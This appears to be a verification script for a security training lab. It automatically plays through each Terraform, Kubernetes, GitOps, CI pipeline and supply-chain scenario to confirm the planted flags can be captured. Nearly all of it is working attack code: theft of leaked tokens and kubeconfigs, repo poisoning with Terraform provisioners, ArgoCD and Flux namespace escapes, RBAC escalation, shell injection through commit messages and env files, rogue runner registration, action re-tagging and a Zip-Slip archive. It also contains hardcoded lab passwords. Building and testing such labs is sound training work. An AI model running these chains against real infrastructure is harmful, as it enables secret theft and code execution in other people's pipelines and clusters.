#!/usr/bin/env bash
# playthrough.sh — runs ON the edge (operator/controller). ACTUALLY exploits each ENABLED scenario
# as a player on the VPC would, and checks the planted flag. Proves the kill-chains fire end-to-end
# (not just that artifacts exist). New tracks are appended here as M2 lands them.
#   usage (from repo root, via orchestrator):  ./orchestrator/lab verify   (or scp + run on edge)
OP=/opt/minilab2/op.key
S="ssh -i $OP -o StrictHostKeyChecking=no -o ConnectTimeout=15"
on(){ h="$1"; shift; $S root@"$h" "$@"; }
AU=svc-admin; AP='Min2lab-Adm!n-2026'; G=http://gitea:3000
PASS=0; FAIL=0; declare -a FAILED
ok(){ printf '  \033[1;32mPASS\033[0m %-6s %s\n' "$1" "$2"; PASS=$((PASS+1)); }
no(){ printf '  \033[1;31mFAIL\033[0m %-6s %s\n' "$1" "$2"; FAIL=$((FAIL+1)); FAILED+=("$1"); }
# chk <id> <flag-inner> <captured-output>
chk(){ if echo "$3" | grep -q "MINILAB{$2}"; then ok "$1" "captured MINILAB{$2}"; \
       else no "$1" "no flag (got: $(echo "$3" | tr -d '\n' | head -c160))"; fi; }
enabled(){ grep -qxF "$1" /opt/minilab2/enabled_scenarios 2>/dev/null; }
# rsx <host> <user> — run a script read from stdin on <host> as <user>, via base64 (no quoting hell)
rsx(){ local host="$1" user="$2" b64; b64=$(base64 -w0)
  if [ "$user" = root ]; then on "$host" "echo $b64 | base64 -d | bash"
  else on "$host" "f=/tmp/.rsx.$$; echo $b64 | base64 -d > \$f; chmod 755 \$f; su $user -c \"bash \$f\"; rm -f \$f"; fi; }

echo "### Terraform / IaC kill-chains ###"

# --- tf_3: cross-team remote state exfil -------------------------------------
# foothold on the alpha apply host (atlantis) -> loot leaked beta cloud creds ->
# use them against MinIO to read team beta's remote state (cross-tenant boundary break).
if enabled tf_3; then
  creds=$(on atlantis "cat /home/deployer/.beta/creds 2>/dev/null")
  bk=$(echo "$creds" | sed -n 's/AWS_ACCESS_KEY_ID=//p'); bs=$(echo "$creds" | sed -n 's/AWS_SECRET_ACCESS_KEY=//p')
  if [ -n "$bk" ] && [ -n "$bs" ]; then
    out=$(on backend "mc alias set tf3 http://127.0.0.1:9000 '$bk' '$bs' >/dev/null 2>&1 && mc cat tf3/tf-state-beta/prod/terraform.tfstate 2>/dev/null")
    chk tf_3 tf_3-cross-team-state "$out"
  else no tf_3 "no leaked beta creds on atlantis"; fi
fi

# --- tf_4: writable auto-applied IaC + scheduled apply (deployer identity) ----
# attacker with SCM write poisons the repo the cron drift-apply pulls; the scheduled
# `iac-apply.sh` then runs attacker code as the privileged deployer -> reads deployer's flag.
if enabled tf_4; then
  W=$(mktemp -d)
  git clone -q "http://$AU:$AP@gitea:3000/alpha/infra.git" "$W/infra" 2>/dev/null
  cat > "$W/infra/pwn.tf" <<'TF'
resource "null_resource" "pwn" {
  triggers = { ts = timestamp() }   # re-fire on every apply (repeatable kill-chain)
  provisioner "local-exec" { command = "cat /home/deployer/flag.txt > /tmp/tf4-proof 2>/dev/null" }
}
TF
  ( cd "$W/infra" && git -c user.email=atk@x -c user.name=atk add -A \
    && { git -c user.email=atk@x -c user.name=atk commit -q -m "drift fix" || true; } \
    && git -c user.email=atk@x -c user.name=atk push -q origin main ) 2>/dev/null
  rm -rf "$W"
  on atlantis "rm -f /tmp/tf4-proof; su deployer -c /usr/local/bin/iac-apply.sh" >/dev/null 2>&1
  chk tf_4 tf_4-state-poisoning "$(on atlantis 'cat /tmp/tf4-proof 2>/dev/null')"
fi

# --- tf_5: transitive module exec (trusted module pulls a submodule w/ a provisioner) ---
# consume the "trusted" alpha/tf-modules//note; it now transitively sources a nested module
# whose local-exec fires on apply -> writes the proof. Player applies a tiny consumer.
if enabled tf_5; then
  out=$(rsx atlantis deployer <<'EOF'
set -e
cd /home/deployer; rm -rf pt5; mkdir pt5; cd pt5
cat > main.tf <<'TF'
module "note" {
  source = "git::http://gitea:3000/alpha/tf-modules.git//note?ref=main"
  name   = "pt5"
}
TF
rm -f /tmp/tf5-proof
/usr/local/bin/terraform init -input=false -no-color >/dev/null 2>&1
/usr/local/bin/terraform apply -auto-approve -no-color >/dev/null 2>&1
cat /tmp/tf5-proof 2>/dev/null
EOF
)
  chk tf_5 tf_5-transitive-module "$out"
fi

# --- tf_6: over-privileged apply identity -> cluster-admin kubeconfig -> crown secret ---
# the apply host holds a cluster-admin kubeconfig (over-priv). Use its client cert to hit the
# k8s API directly (no kubectl needed) and read a kube-system secret only cluster-admin can see.
if enabled tf_6; then
  out=$(rsx atlantis root <<'EOF'
set -e
K=/home/deployer/.kube/config
T=$(mktemp -d)
grep 'certificate-authority-data' "$K" | awk '{print $2}' | base64 -d > "$T/ca"
grep 'client-certificate-data'    "$K" | awk '{print $2}' | base64 -d > "$T/crt"
grep 'client-key-data'            "$K" | awk '{print $2}' | base64 -d > "$T/key"
curl -s --cacert "$T/ca" --cert "$T/crt" --key "$T/key" \
  https://k8s:6443/api/v1/namespaces/kube-system/secrets/crown \
  | sed -n 's/.*"flag": *"\([^"]*\)".*/\1/p' | base64 -d 2>/dev/null
rm -rf "$T"
EOF
)
  chk tf_6 tf_6-k8s-rbac-backdoor "$out"
fi

echo "### GitOps / Kubernetes kill-chains ###"

# --- k8s_1: ArgoCD AppProject escape -> deploy a Job into the restricted platform namespace ----
if enabled k8s_1; then
  W=$(mktemp -d)
  git clone -q "http://$AU:$AP@gitea:3000/alpha/app.git" "$W/app" 2>/dev/null
  cat > "$W/app/deploy/escape.yaml" <<'YML'
apiVersion: batch/v1
kind: Job
metadata: { name: exfil, namespace: platform }
spec:
  backoffLimit: 0
  template:
    spec:
      restartPolicy: Never
      containers:
      - name: x
        image: busybox:1.36
        command: ["sh","-c","echo FOUND=$CROWN"]
        env:
        - name: CROWN
          valueFrom: { secretKeyRef: { name: crown, key: flag } }
YML
  ( cd "$W/app" && git -c user.email=atk@x -c user.name=atk add -A \
    && { git -c user.email=atk@x -c user.name=atk commit -q -m "add monitor job" || true; } \
    && git -c user.email=atk@x -c user.name=atk push -q origin main ) 2>/dev/null
  rm -rf "$W"
  out=$(rsx k8s root <<'EOF'
export KUBECONFIG=/etc/rancher/k3s/k3s.yaml
k3s kubectl -n platform delete job exfil --ignore-not-found >/dev/null 2>&1
k3s kubectl -n argocd annotate app alpha-app argocd.argoproj.io/refresh=hard --overwrite >/dev/null 2>&1
for i in $(seq 1 40); do k3s kubectl -n platform get job exfil >/dev/null 2>&1 && break; sleep 3; done
for i in $(seq 1 25); do
  p=$(k3s kubectl -n platform get pods -l job-name=exfil -o name 2>/dev/null | head -1)
  [ -n "$p" ] && k3s kubectl -n platform logs "$p" 2>/dev/null | grep -q FOUND= && break
  sleep 3
done
p=$(k3s kubectl -n platform get pods -l job-name=exfil -o name 2>/dev/null | head -1)
[ -n "$p" ] && k3s kubectl -n platform logs "$p" 2>/dev/null
EOF
)
  chk k8s_1 k8s_1-argo-project-escape "$out"
fi

# --- k8s_2: pipeline SA -> create pod as a parked cluster-admin SA -> cross-team secret ----
if enabled k8s_2; then
  out=$(rsx k8s root <<'EOF'
export KUBECONFIG=/etc/rancher/k3s/k3s.yaml
TOK=$(k3s kubectl -n alpha create token alpha-ci)
KA="k3s kubectl --server=https://127.0.0.1:6443 --insecure-skip-tls-verify --token=$TOK"
k3s kubectl -n alpha delete pod esc --ignore-not-found >/dev/null 2>&1
cat <<'POD' | $KA -n alpha apply -f - >/dev/null 2>&1
apiVersion: v1
kind: Pod
metadata: { name: esc }
spec:
  serviceAccountName: alpha-deploy
  restartPolicy: Never
  containers:
  - name: x
    image: curlimages/curl:8.10.1
    command: ["sh","-c","T=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); curl -s --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt -H \"Authorization: Bearer $T\" https://kubernetes.default.svc/api/v1/namespaces/beta/secrets/rbac-crown"]
POD
for i in $(seq 1 30); do
  ph=$(k3s kubectl -n alpha get pod esc -o jsonpath='{.status.phase}' 2>/dev/null)
  { [ "$ph" = Succeeded ] || [ "$ph" = Running ]; } && break; sleep 2
done
sleep 4
k3s kubectl -n alpha logs esc 2>/dev/null | sed -n 's/.*"flag": *"\([^"]*\)".*/\1/p' | base64 -d 2>/dev/null
EOF
)
  chk k8s_2 k8s_2-rbac-escalation "$out"
fi

# --- k8s_3: Flux kustomize-controller (cluster-admin) reconciles attacker-writable Git path ----
if enabled k8s_3; then
  W=$(mktemp -d)
  git clone -q "http://$AU:$AP@gitea:3000/alpha/infra.git" "$W/infra" 2>/dev/null
  mkdir -p "$W/infra/fleet"
  cat > "$W/infra/fleet/kustomization.yaml" <<'YML'
apiVersion: kustomize.config.k8s.io/v1beta1
kind: Kustomization
resources: [exfil.yaml]
YML
  cat > "$W/infra/fleet/exfil.yaml" <<'YML'
apiVersion: batch/v1
kind: Job
metadata: { name: flux-exfil, namespace: platform }
spec:
  backoffLimit: 0
  template:
    spec:
      restartPolicy: Never
      containers:
      - name: x
        image: busybox:1.36
        command: ["sh","-c","echo FOUND=$CROWN"]
        env:
        - name: CROWN
          valueFrom: { secretKeyRef: { name: flux-crown, key: flag } }
YML
  ( cd "$W/infra" && git -c user.email=atk@x -c user.name=atk add -A \
    && { git -c user.email=atk@x -c user.name=atk commit -q -m "fleet manifests" || true; } \
    && git -c user.email=atk@x -c user.name=atk push -q origin main ) 2>/dev/null
  rm -rf "$W"
  out=$(rsx k8s root <<'EOF'
export KUBECONFIG=/etc/rancher/k3s/k3s.yaml
k3s kubectl -n platform delete job flux-exfil --ignore-not-found >/dev/null 2>&1
TS=$(date +%s)
k3s kubectl -n flux-system annotate gitrepository fleet reconcile.fluxcd.io/requestedAt="$TS" --overwrite >/dev/null 2>&1
k3s kubectl -n flux-system annotate kustomization fleet reconcile.fluxcd.io/requestedAt="$TS" --overwrite >/dev/null 2>&1
for i in $(seq 1 50); do k3s kubectl -n platform get job flux-exfil >/dev/null 2>&1 && break; sleep 3; done
for i in $(seq 1 25); do
  p=$(k3s kubectl -n platform get pods -l job-name=flux-exfil -o name 2>/dev/null | head -1)
  [ -n "$p" ] && k3s kubectl -n platform logs "$p" 2>/dev/null | grep -q FOUND= && break; sleep 3
done
p=$(k3s kubectl -n platform get pods -l job-name=flux-exfil -o name 2>/dev/null | head -1)
[ -n "$p" ] && k3s kubectl -n platform logs "$p" 2>/dev/null
EOF
)
  chk k8s_3 k8s_3-flux-controller-rce "$out"
fi

# --- k8s_4: exposed ArgoCD API + weak admin -> create+sync an app into a restricted namespace ----
if enabled k8s_4; then
  W=$(mktemp -d)
  git clone -q "http://$AU:$AP@gitea:3000/alpha/app.git" "$W/app" 2>/dev/null
  mkdir -p "$W/app/k4"
  cat > "$W/app/k4/job.yaml" <<'YML'
apiVersion: batch/v1
kind: Job
metadata: { name: k4-exfil, namespace: platform }
spec:
  backoffLimit: 0
  template:
    spec:
      restartPolicy: Never
      containers:
      - name: x
        image: busybox:1.36
        command: ["sh","-c","echo FOUND=$CROWN"]
        env:
        - name: CROWN
          valueFrom: { secretKeyRef: { name: crown4, key: flag } }
YML
  ( cd "$W/app" && git -c user.email=atk@x -c user.name=atk add -A \
    && { git -c user.email=atk@x -c user.name=atk commit -q -m "k4 manifests" || true; } \
    && git -c user.email=atk@x -c user.name=atk push -q origin main ) 2>/dev/null
  rm -rf "$W"
  out=$(rsx k8s root <<'EOF'
export KUBECONFIG=/etc/rancher/k3s/k3s.yaml
GIP=$(getent hosts gitea | awk '{print $1}' | head -1)
A=https://127.0.0.1:30443
TOK=$(curl -sk $A/api/v1/session -H 'Content-Type: application/json' -d '{"username":"admin","password":"admin123"}' | sed -n 's/.*"token":"\([^"]*\)".*/\1/p')
[ -z "$TOK" ] && { echo LOGIN-FAILED; exit 0; }
k3s kubectl -n platform delete job k4-exfil --ignore-not-found >/dev/null 2>&1
cat > /tmp/k4app.json <<JSON
{"metadata":{"name":"k4pwn"},"spec":{"project":"default","source":{"repoURL":"http://$GIP:3000/alpha/app.git","targetRevision":"main","path":"k4"},"destination":{"server":"https://kubernetes.default.svc","namespace":"platform"},"syncPolicy":{"automated":{}}}}
JSON
curl -sk -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' $A/api/v1/applications -d @/tmp/k4app.json >/dev/null 2>&1
sleep 2
curl -sk -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' "$A/api/v1/applications/k4pwn/sync" -d '{}' >/dev/null 2>&1
for i in $(seq 1 40); do k3s kubectl -n platform get job k4-exfil >/dev/null 2>&1 && break; sleep 3; done
for i in $(seq 1 20); do
  p=$(k3s kubectl -n platform get pods -l job-name=k4-exfil -o name 2>/dev/null | head -1)
  [ -n "$p" ] && k3s kubectl -n platform logs "$p" 2>/dev/null | grep -q FOUND= && break; sleep 3
done
p=$(k3s kubectl -n platform get pods -l job-name=k4-exfil -o name 2>/dev/null | head -1)
[ -n "$p" ] && k3s kubectl -n platform logs "$p" 2>/dev/null
rm -f /tmp/k4app.json
EOF
)
  chk k8s_4 k8s_4-argocd-weak-admin "$out"
fi

echo "### IaC / policy / access-control kill-chains ###"

# --- tf_1: malicious provider via .terraformrc redirect -> provider binary runs on plan ----
if enabled tf_1; then
  out=$(rsx atlantis deployer <<'EOF'
cd /home/deployer; rm -rf pt1; mkdir pt1; cd pt1
cat > main.tf <<'TF'
terraform {
  required_providers { null = { source = "hashicorp/null" } }
}
resource "null_resource" "x" {}
TF
rm -f /tmp/tf1-proof
/usr/local/bin/terraform plan -no-color >/dev/null 2>&1 || true
cat /tmp/tf1-proof 2>/dev/null
EOF
)
  chk tf_1 tf_1-malicious-provider "$out"
fi

# --- pol_3: Kyverno namespace-exclusion gap admits a privileged hostPath pod -> node flag ----
if enabled pol_3; then
  out=$(rsx k8s root <<'EOF'
export KUBECONFIG=/etc/rancher/k3s/k3s.yaml
k3s kubectl -n alpha delete pod pol3 --ignore-not-found >/dev/null 2>&1
cat <<'POD' | k3s kubectl apply -f - >/dev/null 2>&1
apiVersion: v1
kind: Pod
metadata: { name: pol3, namespace: alpha }
spec:
  restartPolicy: Never
  containers:
  - name: x
    image: busybox:1.36
    securityContext: { privileged: true }
    command: ["sh","-c","cat /host/pol3-flag.txt"]
    volumeMounts: [{ name: h, mountPath: /host }]
  volumes:
  - name: h
    hostPath: { path: /opt/minilab2 }
POD
for i in $(seq 1 30); do
  ph=$(k3s kubectl -n alpha get pod pol3 -o jsonpath='{.status.phase}' 2>/dev/null)
  { [ "$ph" = Succeeded ] || [ "$ph" = Running ]; } && break; sleep 2
done
sleep 2
k3s kubectl -n alpha logs pol3 2>/dev/null
EOF
)
  chk pol_3 pol_3-kyverno-admission-bypass "$out"
fi

# --- pbac_4: over-scoped CI bot token leaked on the runner -> clone another team's private repo ----
if enabled pbac_4; then
  tok=$(on runner "sed -n 's/GITEA_BOT_TOKEN=//p' /opt/ci-bot.env 2>/dev/null")
  if [ -n "$tok" ]; then
    W=$(mktemp -d)
    git clone -q "http://ci-bot:$tok@gitea:3000/platform/secrets.git" "$W/s" 2>/dev/null
    out=$(cat "$W/s/CROWN.md" 2>/dev/null); rm -rf "$W"
    chk pbac_4 pbac_4-overscoped-token "$out"
  else no pbac_4 "no leaked token on runner"; fi
fi

echo "### Pipeline execution / injection kill-chains (Gitea Actions) ###"

# --- ppe_1: untrusted commit message interpolated into a run: step -> RCE on the runner ----
if enabled ppe_1; then
  on runner 'rm -f /tmp/ppe1-proof' >/dev/null 2>&1
  W=$(mktemp -d); git clone -q "http://$AU:$AP@gitea:3000/alpha/app.git" "$W/app" 2>/dev/null
  ( cd "$W/app"; date > .ppe1-trig
    git -c user.email=atk@x -c user.name=atk add -A
    git -c user.email=atk@x -c user.name=atk commit -q -m 'pwned"; cat /opt/minilab2/ppe1-flag.txt > /tmp/ppe1-proof; echo "x'
    git -c user.email=atk@x -c user.name=atk push -q origin main ) 2>/dev/null
  rm -rf "$W"
  out=$(on runner 'for i in $(seq 1 50); do [ -s /tmp/ppe1-proof ] && break; sleep 3; done; cat /tmp/ppe1-proof 2>/dev/null')
  chk ppe_1 ppe_1-expression-injection "$out"
fi

# --- ppe_3: attacker edits the config file loaded into $GITHUB_ENV -> defines $DEPLOY_CMD ----
if enabled ppe_3; then
  on runner 'rm -f /tmp/ppe3-proof' >/dev/null 2>&1
  W=$(mktemp -d); git clone -q "http://$AU:$AP@gitea:3000/alpha/app.git" "$W/app" 2>/dev/null
  ( cd "$W/app"
    printf 'APP_VERSION=1.0\nDEPLOY_CMD=cat /opt/minilab2/ppe3-flag.txt > /tmp/ppe3-proof\n' > ci/release.env
    git -c user.email=atk@x -c user.name=atk add -A
    git -c user.email=atk@x -c user.name=atk commit -q -m "bump release config"
    git -c user.email=atk@x -c user.name=atk push -q origin main ) 2>/dev/null
  rm -rf "$W"
  out=$(on runner 'for i in $(seq 1 50); do [ -s /tmp/ppe3-proof ] && break; sleep 3; done; cat /tmp/ppe3-proof 2>/dev/null')
  chk ppe_3 ppe_3-github-env-injection "$out"
fi

# --- ppe_2: push an attacker branch whose pipeline reads the unprotected secret (GitLab, shell) ----
if enabled ppe_2; then
  on runner 'rm -f /tmp/ppe2-proof' >/dev/null 2>&1
  W=$(mktemp -d)
  git clone -q "http://oauth2:glpat-minilab2automation01@gitlab.minilab2.lab/beta/web-store.git" "$W/ws" 2>/dev/null
  cat > "$W/ws/.gitlab-ci.yml" <<'YML'
stages: [exfil]
pwn:
  stage: exfil
  tags: [shell]
  script:
    - echo "$DEPLOY_SECRET" > /tmp/ppe2-proof
YML
  ( cd "$W/ws"
    git -c user.email=atk@x -c user.name=atk checkout -q -B attacker
    git -c user.email=atk@x -c user.name=atk add -A
    git -c user.email=atk@x -c user.name=atk commit -q -m "ci tweak"
    git -c user.email=atk@x -c user.name=atk push -q -f origin attacker ) 2>/dev/null
  rm -rf "$W"
  out=$(on runner 'for i in $(seq 1 60); do [ -s /tmp/ppe2-proof ] && break; sleep 3; done; cat /tmp/ppe2-proof 2>/dev/null')
  chk ppe_2 ppe_2-fork-mr-secret-exfil "$out"
fi

# --- pbac_1: a web-store CI job uses its CI_JOB_TOKEN to clone another project (allowlist off) ----
if enabled pbac_1; then
  on runner 'rm -f /tmp/pbac1-proof' >/dev/null 2>&1
  W=$(mktemp -d)
  git clone -q "http://oauth2:glpat-minilab2automation01@gitlab.minilab2.lab/beta/web-store.git" "$W/ws" 2>/dev/null
  cat > "$W/ws/.gitlab-ci.yml" <<'YML'
stages: [x]
steal:
  stage: x
  tags: [shell]
  script:
    - git clone http://gitlab-ci-token:${CI_JOB_TOKEN}@gitlab.minilab2.lab/beta/infra-beta.git /tmp/pbac1-clone
    - cat /tmp/pbac1-clone/CROWN.md > /tmp/pbac1-proof
YML
  ( cd "$W/ws"; git -c user.email=atk@x -c user.name=atk checkout -q -B jobtoken
    git -c user.email=atk@x -c user.name=atk add -A
    git -c user.email=atk@x -c user.name=atk commit -q -m ci
    git -c user.email=atk@x -c user.name=atk push -q -f origin jobtoken ) 2>/dev/null
  rm -rf "$W"
  out=$(on runner 'rm -rf /tmp/pbac1-clone; for i in $(seq 1 60); do [ -s /tmp/pbac1-proof ] && break; sleep 3; done; cat /tmp/pbac1-proof 2>/dev/null')
  chk pbac_1 pbac_1-cijobtoken-crossproject "$out"
fi

# --- pbac_3: push directly to protected main -> protected release secret is in scope ----
if enabled pbac_3; then
  on runner 'rm -f /tmp/pbac3-proof' >/dev/null 2>&1
  W=$(mktemp -d)
  git clone -q "http://oauth2:glpat-minilab2automation01@gitlab.minilab2.lab/beta/web-store.git" "$W/ws" 2>/dev/null
  cat > "$W/ws/.gitlab-ci.yml" <<'YML'
stages: [release]
release:
  stage: release
  tags: [shell]
  script:
    - echo "$RELEASE_KEY" > /tmp/pbac3-proof
YML
  ( cd "$W/ws"; git -c user.email=atk@x -c user.name=atk checkout -q main 2>/dev/null || git -c user.email=atk@x -c user.name=atk checkout -q -B main
    git -c user.email=atk@x -c user.name=atk add -A
    git -c user.email=atk@x -c user.name=atk commit -q -m "release pipeline"
    git -c user.email=atk@x -c user.name=atk push -q origin main ) 2>/dev/null
  rm -rf "$W"
  out=$(on runner 'for i in $(seq 1 60); do [ -s /tmp/pbac3-proof ] && break; sleep 3; done; cat /tmp/pbac3-proof 2>/dev/null')
  chk pbac_3 pbac_3-branch-protection-bypass "$out"
fi

# --- pbac_2: leaked token -> register a rogue runner that steals a victim job's CI secret ----
if enabled pbac_2; then
  GL=http://gitlab
  PAT=$(on runner "sed -n 's/GITLAB_PAT=//p' /opt/leaked-gitlab.pat 2>/dev/null")
  if [ -n "$PAT" ]; then
    PID=$(curl -s -H "PRIVATE-TOKEN: $PAT" "$GL/api/v4/projects?search=payments" | jq -r '.[0].id')
    # pause every currently-registered runner so the rogue one wins the job
    RIDS=$(curl -s -H "PRIVATE-TOKEN: $PAT" "$GL/api/v4/runners/all?per_page=100" | jq -r '.[].id')
    for r in $RIDS; do curl -s -H "PRIVATE-TOKEN: $PAT" -X PUT "$GL/api/v4/runners/$r" -d paused=true >/dev/null 2>&1; done
    RT=$(curl -s -H "PRIVATE-TOKEN: $PAT" -X POST "$GL/api/v4/user/runners" -d runner_type=instance_type -d description=rogue -d tag_list=shell,host -d run_untagged=true | sed -n 's/.*"token":"\([^"]*\)".*/\1/p')
    rsx runner root <<EOF
rm -f /tmp/pbac2-proof; rm -rf /tmp/rogue; mkdir -p /tmp/rogue
gitlab-runner register --config /tmp/rogue/config.toml --non-interactive --url http://gitlab.minilab2.lab --token '$RT' --executor shell --description rogue >/dev/null 2>&1
sed -i '/executor = "shell"/a pre_build_script = "env > /tmp/pbac2-proof"' /tmp/rogue/config.toml
setsid gitlab-runner run --config /tmp/rogue/config.toml >/tmp/rogue/run.log 2>&1 < /dev/null &
echo \$! > /tmp/rogue/pid
EOF
    sleep 6
    curl -s -H "PRIVATE-TOKEN: $PAT" -X POST "$GL/api/v4/projects/$PID/pipeline" -d ref=main >/dev/null 2>&1
    out=$(on runner 'for i in $(seq 1 60); do grep -q "VICTIM_SECRET=MINILAB" /tmp/pbac2-proof 2>/dev/null && break; sleep 3; done; sed -n "s/VICTIM_SECRET=//p" /tmp/pbac2-proof 2>/dev/null')
    # cleanup: stop rogue, unregister it, unpause legit runners
    on runner 'kill $(cat /tmp/rogue/pid) 2>/dev/null; gitlab-runner unregister --all-runners --config /tmp/rogue/config.toml >/dev/null 2>&1; rm -rf /tmp/rogue' >/dev/null 2>&1
    for r in $RIDS; do curl -s -H "PRIVATE-TOKEN: $PAT" -X PUT "$GL/api/v4/runners/$r" -d paused=false >/dev/null 2>&1; done
    chk pbac_2 pbac_2-rogue-runner "$out"
  else no pbac_2 "no leaked token on runner"; fi
fi

# --- tf_2: a PR's atlantis.yaml custom workflow runs arbitrary commands at plan time ----
if enabled tf_2; then
  on atlantis 'rm -f /tmp/tf2-proof' >/dev/null 2>&1
  W=$(mktemp -d); git clone -q "http://$AU:$AP@gitea:3000/alpha/infra.git" "$W/infra" 2>/dev/null
  ( cd "$W/infra"; git -c user.email=atk@x -c user.name=atk checkout -q -B atlantis-pwn 2>/dev/null
    cat > atlantis.yaml <<'YML'
version: 3
projects:
  - dir: .
    workflow: pwn
workflows:
  pwn:
    plan:
      steps:
        - run: cat /opt/minilab2/tf2-flag.txt > /tmp/tf2-proof
        - init
        - plan
YML
    echo "# trigger $(date +%s)" >> main.tf
    git -c user.email=atk@x -c user.name=atk add -A
    git -c user.email=atk@x -c user.name=atk commit -q -m "add atlantis config"
    git -c user.email=atk@x -c user.name=atk push -q -f origin atlantis-pwn ) 2>/dev/null
  rm -rf "$W"
  # open a PR -> gitea webhook -> atlantis autoplan -> custom run: fires
  curl -s -u "$AU:$AP" -H 'Content-Type: application/json' -X POST \
    "http://gitea:3000/api/v1/repos/alpha/infra/pulls" \
    -d '{"title":"infra change","head":"atlantis-pwn","base":"main"}' >/dev/null 2>&1
  out=$(on atlantis 'for i in $(seq 1 50); do [ -s /tmp/tf2-proof ] && break; sleep 3; done; cat /tmp/tf2-proof 2>/dev/null')
  chk tf_2 tf_2-atlantis-custom-workflow "$out"
fi

echo "### Policy-as-code bypass ###"

# --- pol_1: conftest coverage gap -> malicious (uncovered) resource passes the gate ----
if enabled pol_1; then
  out=$(on atlantis 'cd /opt/pol1 && conftest test --policy policy main.tf >/dev/null 2>&1 && cat /opt/minilab2/pol1-flag.txt')
  chk pol_1 pol_1-conftest-coverage-gap "$out"
fi

# --- pol_2: tfsec soft-fail / inline-ignore -> the gate passes a vulnerable config ----
if enabled pol_2; then
  out=$(on atlantis 'cd /opt/pol2 && tfsec . --soft-fail --no-color >/dev/null 2>&1 && cat /opt/minilab2/pol2-flag.txt')
  chk pol_2 pol_2-tfsec-skip-comment "$out"
fi

echo "### Secrets & identity pivots ###"

# --- sec_2: a pod SA token authenticates to Vault (over-broad role) -> reads beta's secret ----
if enabled sec_2; then
  out=$(rsx k8s root <<'EOF'
export KUBECONFIG=/etc/rancher/k3s/k3s.yaml
JWT=$(k3s kubectl -n alpha create token alpha-ci)
VT=$(curl -s http://vault:8200/v1/auth/kubernetes/login -d "{\"role\":\"overbroad\",\"jwt\":\"$JWT\"}" | sed -n 's/.*"client_token":"\([^"]*\)".*/\1/p')
curl -s -H "X-Vault-Token: $VT" http://vault:8200/v1/secret/data/beta/crown | sed -n 's/.*"flag":"\([^"]*\)".*/\1/p'
EOF
)
  chk sec_2 sec_2-vault-k8s-overbroad "$out"
fi

echo "### Supply-chain kill-chains ###"

# --- sup_1: re-point the tag the pipeline trusts -> malicious action runs on next CI run ----
if enabled sup_1; then
  on runner 'rm -f /tmp/sup1-proof' >/dev/null 2>&1
  W=$(mktemp -d)
  git clone -q "http://$AU:$AP@gitea:3000/marketplace/deploy-action.git" "$W/sa" 2>/dev/null
  cat > "$W/sa/action.yml" <<'YML'
name: deploy-helper
description: shared composite action
runs:
  using: composite
  steps:
    - run: cat /opt/minilab2/sup1-flag.txt > /tmp/sup1-proof
      shell: bash
YML
  ( cd "$W/sa"; git -c user.email=atk@x -c user.name=atk add -A
    git -c user.email=atk@x -c user.name=atk commit -q -m "v1.0.1"
    git -c user.email=atk@x -c user.name=atk branch -f v1
    git -c user.email=atk@x -c user.name=atk push -q origin main
    git -c user.email=atk@x -c user.name=atk push -f -q origin v1 ) 2>/dev/null
  rm -rf "$W"
  # trigger alpha/app CI (which pins the action @v1, now malicious)
  W=$(mktemp -d); git clone -q "http://$AU:$AP@gitea:3000/alpha/app.git" "$W/app" 2>/dev/null
  ( cd "$W/app"; date > .sup1-trig; git -c user.email=atk@x -c user.name=atk add -A
    git -c user.email=atk@x -c user.name=atk commit -q -m trigger
    git -c user.email=atk@x -c user.name=atk push -q origin main ) 2>/dev/null
  rm -rf "$W"
  out=$(on runner 'for i in $(seq 1 60); do [ -s /tmp/sup1-proof ] && break; sleep 3; done; cat /tmp/sup1-proof 2>/dev/null')
  chk sup_1 sup_1-action-retag "$out"
fi

# --- sup_4: dependency confusion — CI pulls the attacker's higher version off the mirror ----
if enabled sup_4; then
  on runner 'rm -f /tmp/sup4-proof' >/dev/null 2>&1
  W=$(mktemp -d); git clone -q "http://$AU:$AP@gitea:3000/alpha/app.git" "$W/app" 2>/dev/null
  ( cd "$W/app"; date > .sup4-trig; git -c user.email=atk@x -c user.name=atk add -A
    git -c user.email=atk@x -c user.name=atk commit -q -m trigger
    git -c user.email=atk@x -c user.name=atk push -q origin main ) 2>/dev/null
  rm -rf "$W"
  out=$(on runner 'for i in $(seq 1 70); do [ -s /tmp/sup4-proof ] && break; sleep 3; done; cat /tmp/sup4-proof 2>/dev/null')
  chk sup_4 sup_4-dependency-confusion "$out"
fi

# --- sup_2: poison an upstream artifact with a Zip-Slip member -> overwrite a trusted script ----
if enabled sup_2; then
  on runner 'rm -f /tmp/sup2-proof' >/dev/null 2>&1
  W=$(mktemp -d)
  git clone -q "http://oauth2:glpat-minilab2automation01@gitlab.minilab2.lab/beta/dashboard.git" "$W/d" 2>/dev/null
  python3 - "$W/d/incoming/update.tar" <<'PY'
import tarfile,io,sys
t=tarfile.open(sys.argv[1],'w')
data=b'#!/bin/sh\necho "$SUP2_SECRET" > /tmp/sup2-proof\n'
ti=tarfile.TarInfo('../scripts/release.sh'); ti.size=len(data); ti.mode=0o755
t.addfile(ti, io.BytesIO(data)); t.close()
PY
  ( cd "$W/d"; git -c user.email=atk@x -c user.name=atk add -A
    git -c user.email=atk@x -c user.name=atk commit -q -m "ship upstream update"
    git -c user.email=atk@x -c user.name=atk push -q origin main ) 2>/dev/null
  rm -rf "$W"
  out=$(on runner 'for i in $(seq 1 50); do [ -s /tmp/sup2-proof ] && break; sleep 3; done; cat /tmp/sup2-proof 2>/dev/null')
  chk sup_2 sup_2-zip-slip-artifact "$out"
fi

echo
printf '### playthrough: %d passed, %d failed ###\n' "$PASS" "$FAIL"
[ "$FAIL" -gt 0 ] && echo "FAILED: ${FAILED[*]}"
exit 0
